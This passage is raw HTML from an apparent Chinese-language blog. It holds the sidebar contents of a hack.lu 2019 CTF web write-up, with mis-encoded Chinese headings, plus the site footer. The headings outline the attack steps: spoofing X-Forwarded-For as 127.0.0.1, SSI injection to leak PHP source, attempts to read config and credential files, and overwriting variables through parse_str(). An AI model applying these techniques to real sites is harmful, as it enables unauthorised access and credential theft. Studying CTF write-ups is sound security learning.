href="#è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚"><span class="nav-number">1.9.0.4.</span> <span class="nav-text">è¿™ä¸ªé¡µé¢æä¾›äº†æ³¨å†Œï¼Œç™»é™†å’Œç®¡ç†ä¸€ä¸ªé¡µé¢ï¼Œä¸æ­¤åŒæ—¶è¯¥é¡µé¢å‘Šè¯‰æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å¼€å§‹åˆ†æï¼š"><span class="nav-number">1.9.1.</span> <span class="nav-text">å¼€å§‹åˆ†æï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚"><span class="nav-number">1.9.1.1.</span> <span class="nav-text">æ˜¾ç„¶ï¼Œè¦è¢«è¯†åˆ«ä¸ºç®¡ç†å‘˜ï¼Œæˆ‘ä»¬éœ€è¦æ¥è‡ªç‰¹å®šçš„IPã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬è¦å…ˆæš´éœ²ä¸€ä¸‹ä¸»æœºå†…éƒ¨çš„IPã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨127-0-0-1ï¼Œç«¯å£æ˜¯åœ¨13337ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ X-Forwarded-Foræ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯127-0-0-1ã€‚"><span class="nav-number">1.9.1.2.</span> <span class="nav-text">ä¸€æ—¦æˆ‘ä»¬çŸ¥é“å†…ç½‘åœ°å€æ˜¯åœ¨127.0.0.1ï¼Œç«¯å£æ˜¯åœ¨13337ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ·»åŠ X-Forwarded-Foræ¥è®©æœåŠ¡å™¨ç›¸ä¿¡æˆ‘ä»¬çš„åŸå§‹IPæ˜¯127.0.0.1ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚"><span class="nav-number">1.9.1.3.</span> <span class="nav-text">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å“åº”æ˜¯æˆåŠŸçš„ï¼Œä½†æ˜¯æ²¡æœ‰æˆäºˆä»»ä½•çš„ç®¡ç†å‘˜æƒé™ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒSSIæ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚"><span class="nav-number">1.9.1.4.</span> <span class="nav-text">ç»è¿‡æ•°å°æ—¶çš„éšæœºå°è¯•ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥è¿›è¡ŒSSIæ³¨å…¥æ¥æ³„éœ²é¡µé¢çš„PHPæºä»£ç ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–å…¨éƒ¨æºä»£ç ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š-config-phpï¼Œ-db-config-phpï¼Œ-db-credentials-phpã€‚"><span class="nav-number">1.9.1.5.</span> <span class="nav-text">æˆ‘ä»¬å¯¹æ‰€æœ‰çš„é¡µé¢é‡å¤æ­¤è¿‡ç¨‹å»è·å–å…¨éƒ¨æºä»£ç ã€‚ä¸è¿‡æœåŠ¡å™¨é˜»æ­¢æˆ‘ä»¬è®¿é—®ä½äºå½“å‰ç›®å½•ä»¥å¤–çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½è®¿é—®ä¸‹åˆ—çš„æ–‡ä»¶ï¼š../config.phpï¼Œ../db_config.phpï¼Œ../db_credentials.phpã€‚</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š"><span class="nav-number">1.9.2.</span> <span class="nav-text">æ‹¿åˆ°æºä»£ç åå¼€å§‹åˆ†æï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#æ¥è‡ªlogin-phpï¼š"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">æ¥è‡ªlogin.phpï¼š</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åœ¨è¿™é‡Œï¼Œè¯¥parse-str-å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">åœ¨è¿™é‡Œï¼Œè¯¥parse_str()å‡½æ•°ç”¨äºè§£æPOSTè¯·æ±‚çš„æ­£æ–‡ã€‚PHPæ–‡æ¡£æ˜ç¡®çš„æŒ‡å‡ºã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚"><span class="nav-number">1.9.2.3.</span> <span class="nav-text">äº‹å®ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸Šä¼ é€’å˜é‡æ¥è®¾ç½®å’Œè¦†ç›–å˜é‡ã€‚</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#åç»­è¯·çœ‹https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><span class="nav-number">1.9.2.4.</span> <span class="nav-text">åç»­è¯·çœ‹https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#å‚è€ƒé“¾æ¥"><span class="nav-number">1.9.3.</span> <span class="nav-text">å‚è€ƒé“¾æ¥</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html"><span class="nav-number">1.9.3.1.</span> <span class="nav-text">https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js"><span class="nav-number">1.9.3.2.</span> <span class="nav-text">https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce"><span class="nav-number">1.9.3.3.</span> <span class="nav-text">https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><span class="nav-number">1.9.3.4.</span> <span class="nav-text">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ljdd520</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">110k</span>
  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
